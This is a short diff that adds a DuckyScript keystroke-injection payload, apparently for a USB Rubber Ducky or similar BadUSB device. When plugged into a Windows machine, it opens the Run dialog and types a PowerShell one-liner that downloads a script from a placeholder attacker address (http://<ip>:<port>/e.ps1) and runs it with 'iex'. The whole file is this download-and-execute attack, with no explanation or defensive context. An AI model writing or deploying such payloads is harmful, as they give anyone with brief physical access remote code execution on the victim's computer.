@@ -1,0 +1,4 @@
+GUI r
+DELAY 300
+STRING powershell "irm http://<ip>:<port>/e.ps1 | iex"
+ENTER
